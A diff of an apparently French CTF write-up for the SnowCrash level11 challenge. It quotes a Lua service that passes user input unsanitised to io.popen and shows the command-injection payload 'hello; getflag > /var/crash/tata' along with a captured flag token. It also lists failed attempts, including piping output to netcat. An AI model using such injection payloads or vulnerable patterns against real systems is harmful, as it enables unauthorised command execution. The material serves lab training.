@@ -1,6 +1,49 @@
-level11@SnowCrash:~$ nc localhost 5151
-Password: hello;getflag > /var/crash/test
-Erf nope..
-level11@SnowCrash:~$ cat /var/crash/test
-Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
-level11@SnowCrash:~$
+on a un script en lua qui attend un password.
+on le mofifie, on le lance et on voit que ce n'est pas celui la qui repond. 
+Il y en a un autre qui tourne deja.
+
+on decide tout de meme de modifier celui la et de l'utiliser a la place de celui qui tourne deja
+
+//----------------------------------------------------------------
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+// on a change le port pour 6161
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+  A la place de echo on a essaye de lui faire executer "getflag" mais ca ne marche pas
+  on a essaye "getflag > /var/crash/tata" mais ca ne marche pas
+  on a essaye "getflag | nc 127.0.0.1 6161" mais ca ne marche pas
+
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+//------------------------------------------------------------------------------
+
+Donc il faut passer par celui qui tourne deja
+
+La question est : comment injecter une commande avec le string qu'on doit fournir en input.
+
+on comprend qd on comprend l'importance des .. en lua (concatenent), et le fait qu'une commande n'ait pas besoin de "" ou de `` pour etre executable.
+
+
+level11@SnowCrash:~$ nc 127.0.0.1 5151
+Password: hello; getflag > /var/crash/tata
+
+on recupere le token dans /var/crash/tata
